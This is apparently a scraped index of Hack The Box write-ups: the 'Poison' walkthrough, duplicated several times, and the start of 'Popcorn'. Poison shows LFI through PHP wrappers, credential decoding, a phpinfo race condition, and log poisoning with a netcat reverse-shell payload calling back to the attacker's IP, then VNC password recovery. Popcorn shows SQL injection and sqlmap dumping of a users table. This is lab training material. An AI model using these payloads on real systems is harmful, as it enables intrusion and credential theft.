Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo= Based on the output, we can deduce that the application is not validating user input and therefore is vulnerable to local file inclusion (LFI). Based on the comment, this file includes a password that is encoded. Before we go down the route of decoding the password and trying to SSH into an account using it, let\u2019s see if we can turn the LFI into a remote file inclusion (RFI). There are several methods we can try. PHP http:// Wrapper The PHP http wrapper allows you to access URLs. The syntax of the exploit is: http://[path-to-remote-file] Start a simple python server. python -m SimpleHTTPServer 5555 Attempt to run a file hosted on the server. We get an error informing us that the http:// wrapper is disabled. Similarly, we can try ftp:// but that is also disabled. PHP expect:// Wrapper The PHP expect wrapper allows you to run system commands. The syntax of the exploit is: expect://[command] This functionality is not enabled by default so let\u2019s check if our application has it enabled. Intercept the request using Burp and attempt to run the \u2018id\u2019 command. We get an error informing us that the PHP expect wrapper is not configured. PHP input:// Wrapper The input:// wrapper allows you to read raw data from the request body. Therefore, you can use it to send a payload via POST request. The syntax for the request would be: php://input cmd=[command] The syntax for post data would be: ?php echo shell_exec($GET[ cmd ]); ? This doesn\u2019t work for our request, but I thought it was worth mentioning. There are several other techniques you can try that are not mentioned in this blog. However, I\u2019m confident that the application is not vulnerable to RFI so I\u2019m going to move on. One useful technique you should know is how to view the source code of files using the filter:// wrapper. PHP filter:// Wrapper When a file such as index.php is executed, the page only show the output of the script. To view the source code, you can use the filter:// wrapper. php://filter/convert.base64-encode/resource=[file-name] This will encode the page in base64 and output the encoded string. For example, to view the ini.php file, run the below command. This gives you a base64 encoded version of the source code. Decode the string. echo PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K | base64 --decode You get the source code. ?php print_r(ini_get_all()); ? We diverged a little bit from solving this machine, the conclusion of all the above testing is that it is not vulnerable to an RFI. So let\u2019s move on to gaining an initial foothold on the system. Initial Foothold Gaining an initial foothold can be done in three ways. Decode the pwdbackup.txt file and use the decoded password to SSH into a user\u2019s account. Race condition exploit in phpinfo.php file that turns the LFI to an RCE. Log poisoning exploit that turns the LFI to an RCE. I initially got access to the machine using method 1 and then exploited methods 2 3 after watching ippsec\u2019s video . Method 1: pwdbackup.txt The output of the pwdbackup.txt file gives us a hint that the password is encoded at least 13 times, so let\u2019s write a simple bash script to decode it. #!/bin/bash # secret.txt contains encoded text secret=$( secret.txt) for i in {1..13}; do secret=$( $secret base64 --decode) done echo $secret Save the script in a file called decode.sh and run it. root@kali:~/Desktop/htb/poison# ./decode.sh Charix!2#4%6 8(0 We get back a password. We want to try this password to SSH into a user\u2019s account, however, we don\u2019t have a username. Let\u2019s try and get that using the LFI vulnerability. Enter the following string in the Scriptname field to output the /etc/passwd file. /etc/passwd We get back the following data (truncated). # $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie :/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: ..... charix:*:1001:1001:charix:/home/charix:/bin/csh Only two users have login shells: root and charix. Considering the password we found, we know it belongs to Charix. SSH into Charix account using the credentials we found. ssh charix@10.10.10.84 View the user.txt flag. Method 2: phpinfo.php Race Condition In 2011, this research paper was published outlining a race condition that can turn an LFI vulnerability to a remote code execution (RCE) vulnerability. The following server side components are required to satisfy this exploitable condition: An LFI vulnerability Any script that displays the output of the PHPInfo() configuration As we saw in the enumeration phase, the Poison htb server satisfies both conditions. Therefore, let\u2019s download the script and modify it to fit our needs. First, change the payload to include the following reverse shell available on kali by default. /usr/share/laudanum/php/php-reverse-shell.php Make sure to edit the IP address and port. Next, change the LFIREQ parameter to the one in our application. LFIREQ= GET /browse.php?file=%s You\u2019ll also have to change all the \u201c= \u201d to \u201c= gt\u201d so that the script compiles properly. That\u2019s it for modifying the script. Now, set up a listener to receive the shell. nc -nlvp 1234 Run the script. python phpinfolfi.py 10.10.10.84 80 We get a shell! Method 3: Log Poisoning This was probably the intended way of solving the machine considering that the box is called \u201cPoison\u201d. Log Poisoning is a common technique used to gain RCE from an LFI vulnerability. The way it works is that the attacker attempts to inject malicious input to the server log. Then using the LFI vulnerability, the attacker calls the server log thereby executing the injected malicious code. So the first thing we need to do is find the log file being used on the server. A quick google search tells us that freebsd saves the log file in the following location. /var/log/httpd-access.log A sample entry in the access log is: 10.10.14.12 - - [05/Jan/2020:06:20:15 +0100] GET /browse.php?file=php://filter/convert.base64-encode/resource=ini.php HTTP/1.1 200 44 [http://10.10.10.84/](http://10.10.10.84/) Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Notice that the user agent \u201c Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 \u201d is being logged. Since the user agent is something that is completely in our control, we can simply change it to send a reverse shell back to our machine. Intercept the request in Burp and change the user agent to the reverse shell from pentestmonkey . ?php exec( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.10.14.12 6666 /tmp/f ) ? Set up a listener to receive the reverse shell. nc -nlvp 6666 Execute the request in Burp so that the PHP code is saved in the log file. Using the LFI vulnerability call the log file which in turn should execute the reverse shell. [http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log](http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log) We get a shell! Privilege Escalation Since the machine is running a freeBSD OS, the LinEnum script won\u2019t work on it. So we\u2019ll have to resort to manual means of enumeration. If you list the files in Charix\u2019s home directory, you\u2019ll find a secret.zip file. charix@Poison:~ % ls -l total 8 -rw-r----- 1 root charix 166 Mar 19 2018 secret.zip -rw-r----- 1 root charix 33 Mar 19 2018 user.txt If you try to decompress the file, it will ask for a password. Let\u2019s first transfer the file to our attack machine. scp charix@10.10.10.84:/home/charix/secret.zip . Try to decompress the file using Charix\u2019s SSH password. Most user\u2019s reuse passwords. unzip secret.zip It works! Check the file type. root@kali:~/Desktop/htb/poison# file secret secret: Non-ISO extended-ASCII text, with no line terminators The file seems to be encoded. Before we go down the route of figuring out what type of encoding is being used, let\u2019s park this for now and do more enumeration. In the target machine, run the ps command to see which processes are running. ps -aux There\u2019s a VNC process being run as root. root 529 0.0 0.7 23620 7432 v0- I Fri23 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/sha Let\u2019s view the entire process information. charix@Poison:~ % ps -auxww | grep vnc root 529 0.0 0.7 23620 7432 v0- I Fri23 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1 VNC is a remote access software. The -rfbport flag tells us that it\u2019s listening on port 5901 on localhost. We can verify that using the netstat command. charix@Poison:~ % netstat -an | grep LIST tcp4 0 0 127.0.0.1.25 *.* LISTEN tcp4 0 0 *.80 *.* LISTEN tcp6 0 0 *.80 *.* LISTEN tcp4 0 0 *.22 *.* LISTEN tcp6 0 0 *.22 *.* LISTEN tcp4 0 0 127.0.0.1.5801 *.* LISTEN tcp4 0 0 127.0.0.1.5901 *.* LISTEN Since VNC is a graphical user interface software, we can\u2019t access it through our target machine. We need port forwarding. # ssh -L [local-port]:[remote-ip]:[remote-port] ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84 The above command allocates a socket to listen to port 5000 on localhost from my attack machine (kali). Whenever a connection is made to port 5000, the connection is forwarded over a secure channel and is made to port 5901 on localhost on the target machine (poison). We can verify that the command worked using netstat. root@kali:~/Desktop/htb/poison# netstat -an | grep LIST tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN tcp6 0 0 ::1:5000 :::* LISTEN Now that port forwarding is set, let\u2019s connect to VNC on the attack machine. root@kali:~/Desktop/htb/poison# vncviewer 127.0.0.1:5000 Connected to RFB server, using protocol version 3.8 Enabling TightVNC protocol extensions Performing standard VNC authentication Password: I tried Charix\u2019s password but that didn\u2019t work. I then googled \u201cvnc password\u201d and found the following description on the man page. When setting a VNC password, the password is obfuscated and saved as a file on the server. Instead of directly entering the password, the obfuscated password file can be included using the passwd option. Earlier in this blog we found a secret file that we didn\u2019t know where to use. So let\u2019s see if it\u2019s the obfuscated password file we\u2019re looking for. vncviewer 127.0.0.1:5000 -passwd secret We\u2019re in! VNC was running with root privileges so we can view the root.txt file. Before we end this blog, let\u2019s check if there is any online tools that decode the obfuscated password file. Since it\u2019s not encrypted, we should be able to reverse it without a password. After a bit of googling, I found this github repository that does that for us. Clone the repository and run the script on our file. python vncpasswd.py -d -f ../../htb/poison/secret -d: decrypt -f: file We get the following output showing us the plaintext password is \u201cVNCP@\\$\\$!\u201d. Cannot read from Windows Registry on a Linux system Cannot write to Windows Registry on a Linux system Decrypted Bin Pass= VNCP@$$! Decrypted Hex Pass= 564e435040242421 Now that we know the password, we could directly log into VNC using the plaintext password instead of the obfuscated password file. Lessons Learned To gain an initial foothold on the box we exploited four vulnerabilities. LFI vulnerability that allowed us to both enumerate files and call and execute malicious code we stored on the server. This could have been easily avoided if the developer validated user input. Sensitive information disclosure. The pwdbackup.txt file that contained a user\u2019s SSH password was publicly stored on the server for anyone to read. Since the content of the file was encoded instead of encrypted, we were able to easily reverse the content and get the plaintext password. This could have been avoided if the password file was not publicly stored on the server and strong encryption algorithms were used to encrypt the file. Log file poisoning. Since the log file was storing the user agent (user controlled data) without any input validation, we were able to inject malicious code into the server that we executed using the LFI vulnerability. Again, this could have been easily avoided if the developer validated user input. Security misconfiguration that lead to a race condition in phpinfo.php file. This required two conditions to be present: (1) an LFI vulnerability which we already discussed, and (2) a script that displays the output of the phpinfo() configuration. The administrators should have disabled the phpinfo() function in all production environments. To escalate privileges we exploited one vulnerability. Reuse of password. The zip file that contained the VNC password was encrypted using Charix\u2019s SSH password. The question we really should be asking is why is the password that gives you access to the root account encrypted with a lower privileged user\u2019s password? The remediation recommendations for this vulnerability are obvious. Conclusion 21 machines down, 26 more to go!","title":"8. Poison Writeup w/o Metasploit.md"},{"location":"Retired/Poison Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.84 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 2 ports are open: Port 22: running OpenSSH 7.2 Port 80: running Apache httpd 2.4.29 Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-03 22:13 EST Nmap scan report for 10.10.10.84 Host is up (0.031s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA) | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519) 80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 |_http-title: Site doesn t have a title (text/html; charset=UTF-8). No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=1/3%OT=22%CT=1%CU=35958%PV=Y%DS=2%DC=I%G=Y%TM=5E1002E4 ..... Network Distance: 2 hops Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -p- -oA full 10.10.10.84 No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -p- -oA udp 10.10.10.84 We get back the following result showing that no other ports are open. Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-03 22:16 EST Nmap scan report for 10.10.10.84 Host is up (0.034s latency). Not shown: 65534 closed ports PORT STATE SERVICE 514/udp open|filtered syslog Nmap done: 1 IP address (1 host up) scanned in 3340.51 seconds Before we move on to enumeration, let\u2019s make some mental notes about the nmap scan results. The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it\u2019s unlikely that we gain initial access through this port, unless we find credentials. Ports 80 is running a web server, so we\u2019ll perform our standard enumeration techniques on it.","title":"Reconnaissance"},{"location":"Retired/Poison Writeup wo Metasploit/#enumeration","text":"I always start off with enumerating HTTP first. Port 80 Visit the application in the browser. It\u2019s a simple website that takes in a script name and executes it. We\u2019re given a list of scripts to test, so let\u2019s test them one by one. The ini.php info.php scripts don\u2019t give us anything useful. The phpinfo.php script gives us a wealth of information on the PHP server configuration. The listfiles.php script gives us the following output. Array ( [0] = . [1] = .. [2] = browse.php [3] = index.php [4] = info.php [5] = ini.php [6] = listfiles.php [7] = phpinfo.php [8] = pwdbackup.txt ) The pwdbackup.txt file looks interesting. Let\u2019s see if we can view it in the application. We get the following output. This password is secure, it s encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo= Based on the output, we can deduce that the application is not validating user input and therefore is vulnerable to local file inclusion (LFI). Based on the comment, this file includes a password that is encoded. Before we go down the route of decoding the password and trying to SSH into an account using it, let\u2019s see if we can turn the LFI into a remote file inclusion (RFI). There are several methods we can try. PHP http:// Wrapper The PHP http wrapper allows you to access URLs. The syntax of the exploit is: http://[path-to-remote-file] Start a simple python server. python -m SimpleHTTPServer 5555 Attempt to run a file hosted on the server. We get an error informing us that the http:// wrapper is disabled. Similarly, we can try ftp:// but that is also disabled. PHP expect:// Wrapper The PHP expect wrapper allows you to run system commands. The syntax of the exploit is: expect://[command] This functionality is not enabled by default so let\u2019s check if our application has it enabled. Intercept the request using Burp and attempt to run the \u2018id\u2019 command. We get an error informing us that the PHP expect wrapper is not configured. PHP input:// Wrapper The input:// wrapper allows you to read raw data from the request body. Therefore, you can use it to send a payload via POST request. The syntax for the request would be: php://input cmd=[command] The syntax for post data would be: ?php echo shell_exec($GET[ cmd ]); ? This doesn\u2019t work for our request, but I thought it was worth mentioning. There are several other techniques you can try that are not mentioned in this blog. However, I\u2019m confident that the application is not vulnerable to RFI so I\u2019m going to move on. One useful technique you should know is how to view the source code of files using the filter:// wrapper. PHP filter:// Wrapper When a file such as index.php is executed, the page only show the output of the script. To view the source code, you can use the filter:// wrapper. php://filter/convert.base64-encode/resource=[file-name] This will encode the page in base64 and output the encoded string. For example, to view the ini.php file, run the below command. This gives you a base64 encoded version of the source code. Decode the string. echo PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K | base64 --decode You get the source code. ?php print_r(ini_get_all()); ? We diverged a little bit from solving this machine, the conclusion of all the above testing is that it is not vulnerable to an RFI. So let\u2019s move on to gaining an initial foothold on the system.","title":"Enumeration"},{"location":"Retired/Poison Writeup wo Metasploit/#initial-foothold","text":"Gaining an initial foothold can be done in three ways. Decode the pwdbackup.txt file and use the decoded password to SSH into a user\u2019s account. Race condition exploit in phpinfo.php file that turns the LFI to an RCE. Log poisoning exploit that turns the LFI to an RCE. I initially got access to the machine using method 1 and then exploited methods 2 3 after watching ippsec\u2019s video . Method 1: pwdbackup.txt The output of the pwdbackup.txt file gives us a hint that the password is encoded at least 13 times, so let\u2019s write a simple bash script to decode it. #!/bin/bash # secret.txt contains encoded text secret=$( secret.txt) for i in {1..13}; do secret=$( $secret base64 --decode) done echo $secret Save the script in a file called decode.sh and run it. root@kali:~/Desktop/htb/poison# ./decode.sh Charix!2#4%6 8(0 We get back a password. We want to try this password to SSH into a user\u2019s account, however, we don\u2019t have a username. Let\u2019s try and get that using the LFI vulnerability. Enter the following string in the Scriptname field to output the /etc/passwd file. /etc/passwd We get back the following data (truncated). # $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie :/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: ..... charix:*:1001:1001:charix:/home/charix:/bin/csh Only two users have login shells: root and charix. Considering the password we found, we know it belongs to Charix. SSH into Charix account using the credentials we found. ssh charix@10.10.10.84 View the user.txt flag. Method 2: phpinfo.php Race Condition In 2011, this research paper was published outlining a race condition that can turn an LFI vulnerability to a remote code execution (RCE) vulnerability. The following server side components are required to satisfy this exploitable condition: An LFI vulnerability Any script that displays the output of the PHPInfo() configuration As we saw in the enumeration phase, the Poison htb server satisfies both conditions. Therefore, let\u2019s download the script and modify it to fit our needs. First, change the payload to include the following reverse shell available on kali by default. /usr/share/laudanum/php/php-reverse-shell.php Make sure to edit the IP address and port. Next, change the LFIREQ parameter to the one in our application. LFIREQ= GET /browse.php?file=%s You\u2019ll also have to change all the \u201c= \u201d to \u201c= gt\u201d so that the script compiles properly. That\u2019s it for modifying the script. Now, set up a listener to receive the shell. nc -nlvp 1234 Run the script. python phpinfolfi.py 10.10.10.84 80 We get a shell! Method 3: Log Poisoning This was probably the intended way of solving the machine considering that the box is called \u201cPoison\u201d. Log Poisoning is a common technique used to gain RCE from an LFI vulnerability. The way it works is that the attacker attempts to inject malicious input to the server log. Then using the LFI vulnerability, the attacker calls the server log thereby executing the injected malicious code. So the first thing we need to do is find the log file being used on the server. A quick google search tells us that freebsd saves the log file in the following location. /var/log/httpd-access.log A sample entry in the access log is: 10.10.14.12 - - [05/Jan/2020:06:20:15 +0100] GET /browse.php?file=php://filter/convert.base64-encode/resource=ini.php HTTP/1.1 200 44 [http://10.10.10.84/](http://10.10.10.84/) Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Notice that the user agent \u201c Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 \u201d is being logged. Since the user agent is something that is completely in our control, we can simply change it to send a reverse shell back to our machine. Intercept the request in Burp and change the user agent to the reverse shell from pentestmonkey . ?php exec( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.10.14.12 6666 /tmp/f ) ? Set up a listener to receive the reverse shell. nc -nlvp 6666 Execute the request in Burp so that the PHP code is saved in the log file. Using the LFI vulnerability call the log file which in turn should execute the reverse shell. [http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log](http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log) We get a shell!","title":"Initial Foothold"},{"location":"Retired/Poison Writeup wo Metasploit/#privilege-escalation","text":"Since the machine is running a freeBSD OS, the LinEnum script won\u2019t work on it. So we\u2019ll have to resort to manual means of enumeration. If you list the files in Charix\u2019s home directory, you\u2019ll find a secret.zip file. charix@Poison:~ % ls -l total 8 -rw-r----- 1 root charix 166 Mar 19 2018 secret.zip -rw-r----- 1 root charix 33 Mar 19 2018 user.txt If you try to decompress the file, it will ask for a password. Let\u2019s first transfer the file to our attack machine. scp charix@10.10.10.84:/home/charix/secret.zip . Try to decompress the file using Charix\u2019s SSH password. Most user\u2019s reuse passwords. unzip secret.zip It works! Check the file type. root@kali:~/Desktop/htb/poison# file secret secret: Non-ISO extended-ASCII text, with no line terminators The file seems to be encoded. Before we go down the route of figuring out what type of encoding is being used, let\u2019s park this for now and do more enumeration. In the target machine, run the ps command to see which processes are running. ps -aux There\u2019s a VNC process being run as root. root 529 0.0 0.7 23620 7432 v0- I Fri23 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/sha Let\u2019s view the entire process information. charix@Poison:~ % ps -auxww | grep vnc root 529 0.0 0.7 23620 7432 v0- I Fri23 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1 VNC is a remote access software. The -rfbport flag tells us that it\u2019s listening on port 5901 on localhost. We can verify that using the netstat command. charix@Poison:~ % netstat -an | grep LIST tcp4 0 0 127.0.0.1.25 *.* LISTEN tcp4 0 0 *.80 *.* LISTEN tcp6 0 0 *.80 *.* LISTEN tcp4 0 0 *.22 *.* LISTEN tcp6 0 0 *.22 *.* LISTEN tcp4 0 0 127.0.0.1.5801 *.* LISTEN tcp4 0 0 127.0.0.1.5901 *.* LISTEN Since VNC is a graphical user interface software, we can\u2019t access it through our target machine. We need port forwarding. # ssh -L [local-port]:[remote-ip]:[remote-port] ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84 The above command allocates a socket to listen to port 5000 on localhost from my attack machine (kali). Whenever a connection is made to port 5000, the connection is forwarded over a secure channel and is made to port 5901 on localhost on the target machine (poison). We can verify that the command worked using netstat. root@kali:~/Desktop/htb/poison# netstat -an | grep LIST tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN tcp6 0 0 ::1:5000 :::* LISTEN Now that port forwarding is set, let\u2019s connect to VNC on the attack machine. root@kali:~/Desktop/htb/poison# vncviewer 127.0.0.1:5000 Connected to RFB server, using protocol version 3.8 Enabling TightVNC protocol extensions Performing standard VNC authentication Password: I tried Charix\u2019s password but that didn\u2019t work. I then googled \u201cvnc password\u201d and found the following description on the man page. When setting a VNC password, the password is obfuscated and saved as a file on the server. Instead of directly entering the password, the obfuscated password file can be included using the passwd option. Earlier in this blog we found a secret file that we didn\u2019t know where to use. So let\u2019s see if it\u2019s the obfuscated password file we\u2019re looking for. vncviewer 127.0.0.1:5000 -passwd secret We\u2019re in! VNC was running with root privileges so we can view the root.txt file. Before we end this blog, let\u2019s check if there is any online tools that decode the obfuscated password file. Since it\u2019s not encrypted, we should be able to reverse it without a password. After a bit of googling, I found this github repository that does that for us. Clone the repository and run the script on our file. python vncpasswd.py -d -f ../../htb/poison/secret -d: decrypt -f: file We get the following output showing us the plaintext password is \u201cVNCP@\\$\\$!\u201d. Cannot read from Windows Registry on a Linux system Cannot write to Windows Registry on a Linux system Decrypted Bin Pass= VNCP@$$! Decrypted Hex Pass= 564e435040242421 Now that we know the password, we could directly log into VNC using the plaintext password instead of the obfuscated password file.","title":"Privilege Escalation"},{"location":"Retired/Poison Writeup wo Metasploit/#lessons-learned","text":"To gain an initial foothold on the box we exploited four vulnerabilities. LFI vulnerability that allowed us to both enumerate files and call and execute malicious code we stored on the server. This could have been easily avoided if the developer validated user input. Sensitive information disclosure. The pwdbackup.txt file that contained a user\u2019s SSH password was publicly stored on the server for anyone to read. Since the content of the file was encoded instead of encrypted, we were able to easily reverse the content and get the plaintext password. This could have been avoided if the password file was not publicly stored on the server and strong encryption algorithms were used to encrypt the file. Log file poisoning. Since the log file was storing the user agent (user controlled data) without any input validation, we were able to inject malicious code into the server that we executed using the LFI vulnerability. Again, this could have been easily avoided if the developer validated user input. Security misconfiguration that lead to a race condition in phpinfo.php file. This required two conditions to be present: (1) an LFI vulnerability which we already discussed, and (2) a script that displays the output of the phpinfo() configuration. The administrators should have disabled the phpinfo() function in all production environments. To escalate privileges we exploited one vulnerability. Reuse of password. The zip file that contained the VNC password was encrypted using Charix\u2019s SSH password. The question we really should be asking is why is the password that gives you access to the root account encrypted with a lower privileged user\u2019s password? The remediation recommendations for this vulnerability are obvious.","title":"Lessons Learned"},{"location":"Retired/Poison Writeup wo Metasploit/#conclusion","text":"21 machines down, 26 more to go!","title":"Conclusion"},{"location":"Retired/Popcorn Writeups/","text":"Nmap is a port scanner that is very versatile and is the first tool I use on every CTF. Here is the command that I always use. nmap -sS -n -f- v -A ip addr Great, we can see that the target machine is running Linux with Apache 2.2.12 as its web server. We can also see SSH, but lets go for the low hanging fruit first. Let\u2019s have a look at what on the website. Not much, and no hints the source code either. We will have to carry on enumerating. Let\u2019s use dirbuster to perform a dictionary attack, to see if we can find something we can poke at. Copy the settings above and then hit start. Okay it looks like the meat and gravy of the website is hosted under the folder torrent. Lets go and navigate to http://10.10.10.6/torrent/ Great, now we have loads of things to poke at. Looks like the website is hosting a torrent hoster. We currently don\u2019t have any login credential so let\u2019s do a basic SQL injection to see if the login panel is vulnerable. Here we can see that I\u2019m using the payload, 1' OR '1' = '1 . Hopefully this web server won\u2019t be able to handle the payload. Let\u2019s give it a go. Well, we definatly caused an error. Let\u2019s try and leverage this error and exploit the backend MySQL database. I will be using SQLmap to do this. First let\u2019s find out what POST parameters are being sent when we sent that last request. We can see that we sent the username and password parameter. Cool, now let\u2019s just shove everything into SQLmap. sqlmap -u [http://10.10.10.6/torrent/login.php](http://10.10.10.6/torrent/login.php) --data=\"password=test username=test\" --method POST --dbms MySQL --thread=5 Great the target is vulnerable to SQL injection. Let\u2019s find out what tables they have. sqlmap -u [http://10.10.10.6/torrent/login.php](http://10.10.10.6/torrent/login.php) --data=\"password=test username=test\" --method POST --dbms MySQL --thread=5 --tables This is a no brain-er, we want to select the users table in the torrenthoster database. sqlmap -u [http://10.10.10.6/torrent/login.php](http://10.10.10.6/torrent/login.php) --data=\"password=test username=test\" --method POST --dbms MySQL --thread=5 -T users -D torrenthoster The data does not look right, it looks like it has been shuffled and duplicated. Either way can see that the username is Admin or admin and this user has the hash d5bfedcee289e5e05b86daad8ee3e2e2. Look\u2019s like a MD5 hash but let\u2019s double check with hash-identifier. Now let take the easy option and try and use some online databases to see if the password has already been cracked. No luck. I tried a few sites as well. There is not much point trying to manually crack this hash as it\u2019s a CTF and if someone had cracked 